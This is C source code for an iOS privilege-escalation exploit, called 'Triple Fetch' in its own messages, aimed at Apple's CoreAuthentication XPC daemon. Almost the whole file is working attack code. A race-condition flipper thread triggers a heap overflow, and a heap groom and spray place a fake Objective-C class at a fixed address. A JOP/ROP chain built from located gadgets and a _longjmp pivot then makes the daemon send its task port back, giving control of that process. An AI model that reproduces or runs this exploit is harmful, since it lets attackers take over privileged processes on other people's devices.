#include <setjmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <mach/mach.h>
//#include <mach/mach_vm.h>
#include <objc/objc.h>
#include <mach-o/dyld_images.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED

// use the processor_set_tasks feature to get the task ports for everything:
#include "task_ports.h"

#include "liboxpc/oxpc.h"
#include "minibplist16.h"
#include "xpc_handshake.h"

#include "post_exploit.h"

#import <dlfcn.h>


#import <pthread.h>
#import <mach/mach.h>
#import <sys/mount.h>
#import <spawn.h>
#import <copyfile.h>
#import <mach-o/dyld.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <sys/utsname.h>

extern kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

uint64_t jmpbuf_and_jop_addr = 0;
mach_msg_id_t msgh_id = 0x12344321;

/* 
  returns a send right to a mach_memory_entry port
  which maps a shared view of data.
*/
static mach_port_t
make_shared_memory_port(
  void* data,
  size_t size)
{
  mach_port_t mem_port = MACH_PORT_NULL;
  kern_return_t err;
  err  = mach_make_memory_entry_64(mach_task_self(),
                                   (memory_object_size_t*)&size,
                                   (memory_object_offset_t)data,
                                   VM_PROT_DEFAULT,
                                   &mem_port,
                                   MACH_PORT_NULL);
  if (err != KERN_SUCCESS) {
    printf("failed to make memory entry\n");
    return MACH_PORT_NULL;
  }
  return mem_port;
}

/*
 * serialize an invocation into a shared memory buffer
 * ensures that the returned buffer is at least 0x4000 bytes
 * and page aligned
 */
static void*
build_shm_invocation(
  char* selector,
  void* type_string,         // doesn't have to be NULL terminated
  size_t type_string_length, // length of that
  mach_port_t* shm_port,
  size_t* size)
{
  obp16_object_t inv = obp16_dictionary_alloc();
  obp16_dictionary_append(inv, obp16_ascii_string_alloc_with_cstring("$class"),
                               obp16_ascii_string_alloc_with_cstring("NSInvocation"));

  // pad it out so the 'ty' value string starts 8-byte aligned
  obp16_dictionary_append(inv, obp16_ascii_string_alloc_with_cstring(""),
                               obp16_ascii_string_alloc_with_cstring(""));

  obp16_dictionary_append(inv, obp16_ascii_string_alloc_with_cstring("ty"),
                               obp16_ascii_string_alloc(type_string, type_string_length));
  
  obp16_dictionary_append(inv, obp16_ascii_string_alloc_with_cstring("se"),
                               obp16_ascii_string_alloc_with_cstring(selector));
  
  obp16_object_t ns_dict = obp16_dictionary_alloc();
  obp16_dictionary_append(ns_dict, obp16_ascii_string_alloc_with_cstring("inv"),
                                inv);
  
  // serialize it to a temporary buffer:
  size_t invocation_size = 0;
  void* invocation_buffer = obp16_full_serialize(ns_dict, &invocation_size);
  obp16_object_free(ns_dict);
 
  // OOL xpc data objects have to be GREATER than 0x4000 (ie at least two 16k pages)
  // round up that size to the next 0x4000 boundary:
  mach_vm_size_t shm_size = (invocation_size + 0x7fff) & (~0x3fffULL);
  printf("invocation_size: %zx, shm_size: %llx\n", invocation_size, shm_size);

  // allocate full pages for the buffer
	kern_return_t err;
  mach_vm_address_t shm_addr = 0;
  err = mach_vm_allocate(mach_task_self(), &shm_addr, shm_size, 1);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate shm buffer\n");
    return NULL;
  }
  void* shm_buf = (void*)shm_addr;
  *size = shm_size;

  memcpy(shm_buf, invocation_buffer, invocation_size);
  free(invocation_buffer);

  // create a shared memory port for that buffer
  *shm_port = make_shared_memory_port(shm_buf, shm_size);

  // map the memory backed by the port and flip in there:
  mach_vm_address_t mapped_buf = 0;
  err = vm_map(mach_task_self(),
               (vm_address_t*)&mapped_buf,
               shm_size,
               0,
               1,
               *shm_port,
               0,
               0,
               VM_PROT_DEFAULT,
               VM_PROT_DEFAULT,
               VM_INHERIT_NONE);
  if (err != KERN_SUCCESS) {
    printf("vm_map failed: %x\n", err);
  }
  printf("mapped shm port at: %llx\n", mapped_buf);


  return (void*)mapped_buf;
}

char
random_safe_char()
{
  static int seeded = 0;
  if (seeded == 0) {
    sranddev();
    seeded = 1;
  }

  return 'a' + (rand() % 26);
}

static void*
build_overflower_shm(
  char* selector,
  size_t target_alloc_size,
  size_t overflow_amount,
  void* overflow_data,
  mach_port_t* shm_port,
  size_t* size,
  char** flipper)          // pointer into the SHM region which should be flipped between
                          // '"' and something else
{
  if (target_alloc_size < 0x6) {
    printf("target allocation size too small\n");
    exit(EXIT_FAILURE);
  }
  size_t full_type_string_size = target_alloc_size + overflow_amount + 5 + 2; // + padding + '"' and NULL
  char* type_str = malloc(full_type_string_size);
  memset(type_str, 'A', full_type_string_size);
  type_str[full_type_string_size - 1] = 0;

  uint8_t* serialized_shm = build_shm_invocation(
                              selector,
                              type_str,
                              full_type_string_size,
                              shm_port,
                              size);
  if (serialized_shm == NULL) {
    printf("serialization failed\n");
    exit(EXIT_FAILURE);
  }

  // find the string in there, this is easier than changing the serialization code to tell us where it goes
  char* serialized_type_str = memmem(serialized_shm, *size, type_str, full_type_string_size);
  if (serialized_type_str == NULL) {
    printf("unable to find the serialized type string in the SHM buffer??\n");
    exit(EXIT_FAILURE);
  }

  // build the shorter string:
  // format is: @"ABCD"
  // which leads to an allocation of 7 bytes
  char* at = serialized_type_str;
  char* quote_start = at + 1;
  char* quote_end = at + target_alloc_size - 1;

  *at = '@';
  *quote_start = '"';
  *quote_end = '"';

  // these get cached so add some entropy to prevent that and allow multiple attempts
  for (int i = 0; i < 3; i++) {
    *(quote_start+1+i) = random_safe_char();
  }

  // add the overflow payload:
  // although the computed size is added to 0x2a to allocate the structure
  // the copy actually starts at +0x25 so we need to shift the payload right that
  // much
  memcpy(quote_end + 1 + 5, overflow_data, overflow_amount);

  *(quote_end + overflow_amount + 5 + 1) = '"';
  *(quote_end + overflow_amount + 5 + 2) = '\0';

  //*flipper = quote_end;
  *flipper = at;

  return serialized_shm;
}

// 0x2000 works but is big
//#define GROOM_SIZE 0x2000
#define GROOM_SIZE 0x1000
static oxpc_object_t
add_heap_groom_to_dictionary(oxpc_object_t dict)
{
  uint8_t uuid[16];

  *((uint64_t*)(&uuid[0])) = 0x4141414141414141;  //
  *((uint64_t*)(&uuid[8])) = jmpbuf_and_jop_addr; //



  // build keys which will end up in the small (not tiny) heap:
  char* keys[GROOM_SIZE];
  for (int i = 0; i < GROOM_SIZE; i++) {
    char* k = malloc(1048);
    memset(k, 'A', 1048);
    sprintf(&k[1024], "%d", i);
    keys[i] = k;
  }

  for (int i = 0; i < GROOM_SIZE; i++) {
    oxpc_dictionary_append(dict, keys[i], oxpc_uuid_alloc(uuid));
  }

  for (int i = 0; i < GROOM_SIZE/2; i+=4) {
    // poke holes
    oxpc_dictionary_append(dict, keys[i], oxpc_dictionary_alloc());
  }

  // allocate a bunch of quite large objects then free them to ensure that
  // any carvings come from here and don't add to the 0x30 freelist:
  char* data_keys[100];
  for (int i = 0; i < 100; i++) {
    char* k = malloc(1048);
    memset(k, 'B', 1048);
    sprintf(&k[1024], "%d", i);
    data_keys[i] = k;
  }

  char* tiny_data = malloc(0x300);
  for (int i = 0; i < 100; i++) {
    oxpc_dictionary_append(dict, data_keys[i], oxpc_data_alloc(tiny_data, 0x300));
  }
  for (int i = 0; i < 100; i+=2) {
    oxpc_dictionary_append(dict, data_keys[i], oxpc_uuid_alloc(uuid));
  }
  free(tiny_data);

  return dict; 
}

volatile int stop_flipper_thread = 0;

static void*
flipper_thread(
  void* arg)
{
  printf("flipper arg: %p\n", arg);

  int err = pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
  if (err != 0) {
    printf("failed to set async cancellability for flipper thread\n");
  }
  
  uint64_t* input = (uint64_t*)arg;
  
  volatile uint64_t* q1 = &input[0];
  volatile uint64_t* q2 = &input[1];
  volatile uint64_t* q3 = &input[2];
  
  uint64_t original_q1 = *q1;
  uint64_t original_q2 = *q2;
  uint64_t original_q3 = *q3;
  
  // the replacement q1 should not contain the '"'
  uint64_t replacement_q1 = original_q1;
  replacement_q1 &= 0xffff00ffffffffff;
  replacement_q1 |= 0x0000410000000000;

  // the replacement q3 should not contain null in the lower three bytes
  uint64_t replacement_q3 = 0x0000000022414141;

  printf("[INFO]: original_q1:    0x%016llx\n", original_q1);
  printf("[INFO]: replacement_q1: 0x%016llx\n", replacement_q1);

  printf("[INFO]: original_q2:    0x%016llx\n", original_q2);
  
  printf("[INFO]: original_q3:    0x%016llx\n", original_q3);
  printf("[INFO]: replacement_q3: 0x%016llx\n", replacement_q3);


  /*
  * we define arg to now point to a string which looks like this:
  * @"EFG"QQQQQXXXXXXXX"\0
  *
  * split up into qwords thats: (TODO: make this end up actually aligned in the shared mem!)
  * @"EFG"II IIIXXXXX XXX"\0ZZZ
  *   (Q1)     (Q2)     (Q3)
  *
  * XXXXXXXX is the overwrite contents (it can't contain '<' (0x3c))
  *
  * we want to move between three states:
  *
  * 1) Q1 has the second quote - we want to be in this state for the initial buffer length calculation
  * 2) Q1 doesn't have the second quote and no X's are null - we want to be in this state for the first check in _NSMS1
  * 3) Q1 doesn't have the second quote and X can contain nulls
  */

  while (1) {
    // state 1:
    *q1 = original_q1;
    for (volatile int cnt = 0; cnt < 100; cnt++);

    *q1 = replacement_q1;
    for (int i = 0; i < 1; i++) {
      // state 2:
      *q3 = replacement_q3;
      for (volatile int cnt = 0; cnt < 50; cnt++);

      // state 3:
      *q3 = original_q3;
      for (volatile int cnt = 0; cnt < 50; cnt++);
    }
    if (stop_flipper_thread){
      stop_flipper_thread = 0;
      return NULL;
    }
  }

  return NULL;
}

// did we get a notification message?
int got_no_more_senders(mach_port_t q) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       q,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  if (err == KERN_SUCCESS && msg_id == 0x46) {
//    printf("got NMS\n");
    return 1;
  }
  return 0;
}

struct task_port_msg {
  mach_msg_header_t hdr;
  mach_msg_trailer_t trailer;
};

mach_port_t
check_if_we_got_task_port(
  mach_port_t q)
{
  struct task_port_msg msg;

  kern_return_t err;
  err = mach_msg(&msg.hdr,
                 MACH_RCV_MSG|MACH_RCV_TIMEOUT,
                 0,
                 sizeof(msg),
                 q,
                 1, // timeout
                 0);
  
  if (err == KERN_SUCCESS) {
      printf("[INFO]: Got task port message\n");
    if (msg.hdr.msgh_id == msgh_id) {
      printf("[INFO]: task port: %x\n", msg.hdr.msgh_remote_port);
      return msg.hdr.msgh_remote_port;
    }
  }
  return 0;
}

/* gadgets */

/*
 these are gadgets of the form:
 LDR             X0, [X0,#0x20]
 LDR             X?, [X0,#0x10]
 BR              X?
 where X? is X1..X8
*/

char* x0_jops[] =
  {
    "\x00\x10\x40\xf9\x01\x08\x40\xf9\x20\x00\x1f\xd6", // X1
    "\x00\x10\x40\xf9\x02\x08\x40\xf9\x40\x00\x1f\xd6", // X2
    "\x00\x10\x40\xf9\x03\x08\x40\xf9\x60\x00\x1f\xd6", // X3
    "\x00\x10\x40\xf9\x04\x08\x40\xf9\x80\x00\x1f\xd6", // X4
    "\x00\x10\x40\xf9\x05\x08\x40\xf9\xa0\x00\x1f\xd6", // X5
    "\x00\x10\x40\xf9\x06\x08\x40\xf9\xc0\x00\x1f\xd6", // X6
    "\x00\x10\x40\xf9\x07\x08\x40\xf9\xe0\x00\x1f\xd6", // X7
    "\x00\x10\x40\xf9\x08\x08\x40\xf9\x00\x01\x1f\xd6", // X8
    NULL
  };
size_t x0_jop_length = 12;

uint64_t
find_gadget_candidate(
  char** alternatives,
  size_t gadget_length)
{
  void* haystack_start = (void*)atoi;    // will do...
  size_t haystack_size = 100*1024*1024; // likewise...
  
  for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
    void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
    if (found_at != NULL){
      printf("[INFO]: found at: %llx\n", (uint64_t)found_at);
      return (uint64_t)found_at;
    }
  }
  
  return 0;
}

uint64_t
find_mach_msg_gadget()
{
  /*
   * this is the place in mach_msg we want to jump to:
   * mov    x1, x26
   * mov    x2, x25
   * mov    x3, x22
   * mov    x4, x21
   * mov    x5, x20
   * mov    x6, x19
   * mov    x0, x23
   * bl     0x191975180 ; mach_msg_trap
   * cmp    w0, w27
   * b.eq   0x19197500c               ; <+92> don't want to take this branch which does another send
   * tbnz   w24, #10, 0x191975080     ; <+208> want to take this branch which goes to epilogue:
   *
   * ldp    x29, x30, [sp, #80]
   * ldp    x20, x19, [sp, #64]
   * ldp    x22, x21, [sp, #48]
   * ldp    x24, x23, [sp, #32]
   * ldp    x26, x25, [sp, #16]
   * ldp    x28, x27, [sp], #96
   * ret
   *
   * it uses the callee saved registers to make the mach_msg trap so we can easily control all the arguments
   * in order to only send once we need to also set x27 to a value the mach_msg trap will not return
   * and set bit 10 in x24 to 1.
   */
  
  char* mach_msg_gadget_sig = "\xe1\x03\x1a\xaa\xe2\x03\x19\xaa\xe3\x03\x16\xaa\xe4\x03\x15\xaa";
  void* mach_msg_gadget = memmem((void*)mach_msg, 0x1000, mach_msg_gadget_sig, 16);
  
  if (mach_msg_gadget == NULL){
    printf("unable to find the correct entry point in mach_msg for the send gadget\n");
    return 0;
  }
  uint64_t addr = (uint64_t)mach_msg_gadget;
  printf("[INFO]: found mach_msg gadget: %llx\n", addr);
  return addr;
}

uint64_t
find_mach_msg_epilogue_gadget()
{
  /*
   * ldp    x29, x30, [sp, #80]
   * ldp    x20, x19, [sp, #64]
   * ldp    x22, x21, [sp, #48]
   * ldp    x24, x23, [sp, #32]
   * ldp    x26, x25, [sp, #16]
   * ldp    x28, x27, [sp], #96
   * ret
   */
  
  char* mach_msg_epilogue_gadget_sig = "\xfd\x7b\x45\xa9\xf4\x4f\x44\xa9\xf6\x57\x43\xa9\xf8\x5f\x42\xa9";
  void* mach_msg_epilogue_gadget = memmem((void*)mach_msg, 0x1000, mach_msg_epilogue_gadget_sig, 16);
  
  if (mach_msg_epilogue_gadget == NULL){
    printf("unable to find the correct entry point in mach_msg for the epilogue gadget\n");
    return 0;
  }
  uint64_t addr = (uint64_t)mach_msg_epilogue_gadget;
  printf("[INFO]: found mach_msg epilogue gadget: %llx\n", addr);
  return addr;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
  if (blr_x19_addr != 0){
    return blr_x19_addr;
  }
  char* blr_x19 = "\x60\x02\x3f\xd6";
  char* candidates[] = {blr_x19, NULL};
  blr_x19_addr = find_gadget_candidate(candidates, 4);
  return blr_x19_addr;
}

#if 0
// these are just used to test the rop locally
typedef void* xpc_object_t;
extern xpc_object_t xpc_uuid_create(const uuid_t uuid);
extern void xpc_release(xpc_object_t obj);
#endif

// returns the base of the spray
uint64_t build_spray_page() {
  kern_return_t err;
  /* // need: 0x600 bytes for mach messages
   * heapspray layout:
   * 0x120204020 - fake objective-c isa - when we get pc control X0 points here
   *
   * 0x120204080 - initial pc JOP gadget sets X0 to point to here                                  | the stack pivot will also use 0x120204080 as a jmpbuf
   * 0x120204090 - initial pc JOP gadget reads next pc from here - point it to stack_pivot gadget  | meaning that the SP will be read from somewhere down here
   * 0x120204098 - x22                                                                             |
   * ... - other callee saved regs
   * 0x1202040d8 - x30 (LR) register value restored by _longjmp - next PC, set to a callee_restore gadget
   * 0x1202040e0 - X29 register value restored by _longjmp
   * 0x1202040e8 - sp register value restored by _longjmp - set to 0x120204800
   * ... - SIMD registers
   * 0x120204130 - end of jmpbuf
   *
   * 0x120204200 - mach messages to send (0x600 bytes of hardcoded mach messages)

   * ROP stack:
   * 0x120204800 : callee_restore gadget
   *             : pc -> mach_msg_post_prologue_gadget
   */
  
  mach_vm_address_t spray_base = 0x120204000;
  mach_vm_size_t spray_page_size = 0x4000;
  err = mach_vm_allocate(mach_task_self(), &spray_base, spray_page_size, 0); // FIXED
  if (err != KERN_SUCCESS) {
    printf("mach_vm_allocate at a fixed address failed\n");
    return 0;
  }

  printf("[INFO]: mapped fixed addr\n");
  
  struct fake_class_layout {
    uint64_t pad_0;              // +0x0
    uint64_t pad_1;              // +0x8
    uint64_t cache_buckets_ptr;  // +0x10
    uint64_t cache_buckets_mask; // +0x18
    uint64_t cached_sel;         // +0x20
    uint64_t cached_fptr;        // +0x28
  };
  
  struct fake_class_layout* fake_class = (struct fake_class_layout*)(spray_base + 0x20);
  
  // will set X0 to 0x120204080 then branch to _longjmp
  uint64_t initial_pc = find_gadget_candidate(x0_jops, x0_jop_length);
  
  uint64_t target_selector = (uint64_t)sel_registerName("_xref_dispose");
  printf("target selector address: %llx\n", target_selector);
  
  fake_class->pad_0 = 0;
  fake_class->pad_1 = 0;
  fake_class->cache_buckets_ptr = ((uint64_t)fake_class) + 0x20;
  fake_class->cache_buckets_mask = 0;
  fake_class->cached_sel = target_selector;
  fake_class->cached_fptr = initial_pc;

  
  // build the jop gadget which sets up for the pivot and jmpbuf which overlaps that:
  struct jmpbuf {
    uint64_t x19;
    uint64_t x20;
    uint64_t x21;
    uint64_t x22;
    uint64_t x23;
    uint64_t x24;
    uint64_t x25;
    uint64_t x26;
    uint64_t x27;
    uint64_t x28;
    uint64_t x29_ign; // gets reloaded
    uint64_t x30;
    uint64_t x29;
    uint64_t sp; // set via X2
    uint64_t d8; // SIMD regs
    uint64_t d9;
    uint64_t d10;
    uint64_t d11;
    uint64_t d12;
    uint64_t d13;
    uint64_t d14;
    uint64_t d15;
  };  // 0xb0 (176) bytes
  jmpbuf_and_jop_addr = (uint64_t)(spray_base + 0x80);
  struct jmpbuf* jmpbuf = (struct jmpbuf*)(jmpbuf_and_jop_addr); // 0x120204080

  uint64_t stack_pivot = (uint64_t)_longjmp;
  printf("stack pivot: %llx\n", stack_pivot);
  // the jmpbuf will first be used for the JOP gadget which reads its next pc value from +0x10
  // which overlaps with x21, so set that to be the actual stack pivot gadget:
  jmpbuf->x21 = stack_pivot;
  
  // point sp to the rop stack
  jmpbuf->sp = spray_base + 0x800; // 0x120204800;
  
  // don't jump straight to the mach_msg gadget because we don't properly control
  // all the required regs yet as x21 will also get used by the JOP gadget for pc
  // to point to the _longjmp
  jmpbuf->x30 = find_mach_msg_epilogue_gadget();
  
  
  // build all the mach messages:
  uint64_t first_mach_message = (spray_base + 0x200); // 0x120204200
  mach_msg_header_t* msg = (mach_msg_header_t*)first_mach_message;
  
  mach_port_name_t target_send_right = 0xb0003; // first generation number
  for (int i = 0; i < 64; i++) {
    msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(mach_msg_header_t);
    msg->msgh_remote_port = target_send_right;
    msg->msgh_local_port = 0x103; // send a send right to the task port as the reply port
    msg->msgh_voucher_port = MACH_PORT_NULL;
    msg->msgh_id = msgh_id;
    
    msg++;
    target_send_right += 4;
  }
  
  uint8_t* rop_base = (uint8_t*)(spray_base + 0x800);
  
  /*
   * we overflow into the first 8 bytes of an xpc_uuid object
   *
   * This allows us to point the objective-c isa pointer to controlled data (via shared memory heap spray)
   *
   * This fake isa structure gives us pc control with X0 pointing to the xpc_uuid object.
   *
   * overwriting the whole object with controlled values is made
   * more complicated by the fact that writing NULL bytes requires winning a race
   * so instead of pivoting the stack directly to X0 we use an initial JOP gadget
   * to gain arbitrary X0 control:
   *
   * LDR             X0, [X0,#0x20]
   * LDR             X?, [X0,#0x10]
   * BR              X?
   *
   * where X? is any register other than X0
   *
   * This works because we control the 16 bytes of the xpc_uuid object at +0x18
   */

  
  uint64_t mach_msg_gadget = find_mach_msg_gadget();
  
  // build the ROP stack:
  // use the restore at the end of mach_msg
  struct rop_callee_saved_restore {
    uint64_t x28;
    uint64_t x27;
    uint64_t x26;
    uint64_t x25;
    uint64_t x24;
    uint64_t x23;
    uint64_t x22;
    uint64_t x21;
    uint64_t x20;
    uint64_t x19;
    uint64_t x29;
    uint64_t x30;
  }; // 0x60 (96) bytes
  
  struct rop_callee_saved_restore* regs = (struct rop_callee_saved_restore*)rop_base;
  
  for (int i = 0; i < 64; i++) {
    memset(regs, 0x41, sizeof(*regs));
    // these regs become the args for a mach_msg trap:
    regs->x23 = first_mach_message + (i*sizeof(mach_msg_header_t)); // msg
    regs->x26 = 1;                                                  // options: MACH_MSG_SEND
    regs->x25 = sizeof(mach_msg_header_t);                          // send_size: 24
    regs->x22 = 0;                                                  // rcv_size
    regs->x21 = 0;                                                  // rcv_name
    regs->x20 = 0;                                                  // timeout
    regs->x19 = 0;                                                  // notify

    // need these values to make the gadget work
    regs->x27 = 0x41424344;
    regs->x24 = 0xffffffff;
    
    regs->x30 = mach_msg_gadget;
    
    regs++; // next frame
  }
  
  // go into an infinite loop:
  uint64_t blr_x19 = find_blr_x19_gadget();
  regs->x19 = blr_x19;
  regs->x30 = blr_x19;
  
#if 0
  /*** emulate the exploit for testing the ROP ***/
  
  // allocate an xpc_uuid object which we'll "overflow" into:

  uint64_t uuid_64[2] = {0x4141414142424242, jmpbuf_and_jop_addr};
  xpc_object_t xpc_uuid = xpc_uuid_create((uint8_t*)uuid_64);
  
  // "overflow" into the xpc_uuid:
  *(uint64_t*)(xpc_uuid) = 0x120204020;
  
  // trigger the objective-c method call:
  xpc_release(xpc_uuid);
#endif
  
  return (uint64_t)spray_base;
}

                                          
// return a port set on which we hope to recive the target's task port
static mach_port_t
add_heap_spray_to_dictionary(
  oxpc_object_t dict)
{
  void* heapspray_contents =  (void*) build_spray_page();
  
  size_t heapspray_page_size = 0x4000;
  size_t n_heapspray_pages = 0x200; // 0x100 works too
  size_t full_heapspray_size = n_heapspray_pages * heapspray_page_size;
  
  kern_return_t err;
  mach_vm_address_t full_heapspray = 0;
  err = mach_vm_allocate(mach_task_self(), &full_heapspray, full_heapspray_size, 1);
  
  for (size_t i = 0; i < n_heapspray_pages; i++) {
    memcpy((void*)(full_heapspray + (i*heapspray_page_size)), heapspray_contents, heapspray_page_size);
  }
  
  // wrap that in an xpc data object
  mach_port_t shm_port = make_shared_memory_port((void*)full_heapspray, full_heapspray_size);
  oxpc_object_t xpc_data = oxpc_ool_data_alloc(shm_port, full_heapspray_size);
  
  for (int i = 0; i < 200; i++) {
    char key[128];
    sprintf(key, "heap_spray_%d", i);
    oxpc_dictionary_append(dict, key, xpc_data);
  }
  
  // a port set for the sprayed send rights:
  mach_port_t ps;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &ps);
  for (int i = 0; i < 0x1000; i++) {
    char key[32];
    sprintf(key, "port_%d", i);
    mach_port_t p;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
    
    // add a send right into the message:
    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
    oxpc_dictionary_append(dict, key, oxpc_mach_send_alloc(p));
    
    // move the receive right into the port set;
    mach_port_move_member(mach_task_self(), p, ps);
  }
  return ps;
}

/*
 * this exploit needs:
 *   * mach service name for the target NSXPC service
 *   * any selector name in the service protocol
 */
static mach_port_t sploit() {

    char* service_name = "com.apple.CoreAuthentication.daemon";
    char* selector = "connectToExistingContext:callback:reply:";
    
  int alloc_size = 0x30-0x2a;
  uint8_t overflow_data[] = {0x20, 0x40, 0x20, 0x20, 0x01, 0x00, 0x00, 0x00}; // 0x120204020
  int overflow_amount = 0x8;

  mach_port_t shm_port = MACH_PORT_NULL;
  size_t shm_size = 0;
  char* flipper = NULL;
  build_overflower_shm(
    selector,
    alloc_size,
    overflow_amount,
    overflow_data,
    &shm_port,
    &shm_size,
    &flipper); // this is the pointer into shared memory

  printf("[INFO]: shm_port: %x - shm_size: %zx\n", shm_port, shm_size);

  // start the flipper thread
  pthread_t th;
  pthread_create(&th, NULL, flipper_thread, (void*)flipper);
  printf("[INFO]: started flipper thread\n");

  // now build the XPC message using that shm port as an OOL data
  oxpc_object_t xpc_msg_dict = oxpc_dictionary_alloc();

  // add the heap spray to get known data at a known address
  // this returns a port set which, if the exploit works, will receive
  // the target's task port!
  mach_port_t target_ps = add_heap_spray_to_dictionary(xpc_msg_dict);

  // then do the actual groom
  add_heap_groom_to_dictionary(xpc_msg_dict);
  
  // add the fields required for the remote procedure call passing the invocation data in the ool
  // data object
  oxpc_object_t invocation_data = oxpc_ool_data_alloc(shm_port, shm_size);
  oxpc_dictionary_append(xpc_msg_dict, "root", invocation_data);
  oxpc_dictionary_append(xpc_msg_dict, "proxynum", oxpc_uint64_alloc(1));
  
  size_t exploit_message_size = 0;
  mach_msg_header_t* exploit_message = oxpc_object_serialize_to_mach_message(xpc_msg_dict, 0x1234, MACH_PORT_NULL, &exploit_message_size);
    
  int count = 0;
    
  // fill in the destination port each time we send it.
  while (1) {
    // connect to the service:
    mach_port_t client_port = MACH_PORT_NULL;
    mach_port_t reply_port = MACH_PORT_NULL;

    xpc_connect(service_name, &client_port, &reply_port);

    if (client_port == MACH_PORT_NULL || reply_port == MACH_PORT_NULL) {
      printf("failed to connect to xpc service\n");
      exit(EXIT_FAILURE);
    }
      
#if 0
    // send that xpc_msg_dict as a mach message to the service client port:
    kern_return_t mach_err;
    mach_err = oxpc_object_send_as_mach_message(xpc_msg_dict, client_port, MACH_PORT_NULL);
    if (mach_err != KERN_SUCCESS) {
      printf("failed to send xpc object as mach message %x %s\n", mach_err, mach_error_string(mach_err));
      exit(EXIT_FAILURE);
    }
    printf("sent message!\n"); 
      
#endif

    exploit_message->msgh_remote_port = client_port;

    // we now need to be able to tell what happened:
    // a) lost the race safely: the connection will be cancelled
    //    and the client connection port will become a dead_name
    // b) won the race but groom failed: process will crash and client connection will become a dead name
    // c) win!

    // give ourselves a send right on the reply port:
    //mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
    
    // request no senders notification on the reply port
    mach_port_t notify_q = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify_q);
    mach_port_t old_so = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_request_notification(mach_task_self(),
                                         reply_port,
                                         MACH_NOTIFY_NO_SENDERS,
                                         0,
                                         notify_q,
                                         MACH_MSG_TYPE_MAKE_SEND_ONCE,
                                         &old_so);
    if (err != KERN_SUCCESS) {
      printf("failed to register for no senders notification (%s)\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
      
      
      
      // actually send the message:
      err = mach_msg_send(exploit_message);
      if (err != KERN_SUCCESS){
          printf("[ERROR]: Failed to send exploit message\n");
      } else {
          printf("[INFO]: Sent exploit message [%d]\n", count);
          count++;
      }
      
    int try_count = 0;
      
    while (1) {
        
      // add a check to see if we succeeded!
      mach_port_t target_task_port = check_if_we_got_task_port(target_ps);
      if (target_task_port != MACH_PORT_NULL) {
        printf("[INFO]: Triple Fetch succeeded\n");
        
        // stop the flipper thread:
        //pthread_cancel(th);
        stop_flipper_thread = 1;
        pthread_join(th, NULL);
        
        // clean up the resources
        mach_port_destroy(mach_task_self(), notify_q);
        mach_port_destroy(mach_task_self(), client_port);
        mach_port_destroy(mach_task_self(), reply_port);
        
        return target_task_port;
      } else {
          
          if(try_count > 30000) {
              
              printf("[ERROR]: Too many attempts. Failed.\n");
              
              // Clean and quit
              mach_port_destroy(mach_task_self(), notify_q);
              mach_port_destroy(mach_task_self(), client_port);
              mach_port_destroy(mach_task_self(), reply_port);
              return MACH_PORT_NULL;
          }
      }
    

      // then check if we failed:
      if (got_no_more_senders(notify_q)) {
          
        // clean up the resources
        mach_port_destroy(mach_task_self(), notify_q);
        mach_port_destroy(mach_task_self(), client_port);
        mach_port_destroy(mach_task_self(), reply_port);

        break;
      }
        try_count++;
    }
  }
    
  return MACH_PORT_NULL;
}


mach_port_t do_exploit() {
    
    printf("[*] starting Triple Fetch\n");
    
    mach_port_t tp = sploit();

    if (tp != MACH_PORT_NULL){
        printf("[INFO]: Got target service task port: %x\n", tp);
    } else {
        printf("[ERROR]: Triple Fetch failed!\n");
        printf("[INFO]: Restart your device and try again. Triple fetch might take a couple of tries\n");
    }
    
    return tp;
}

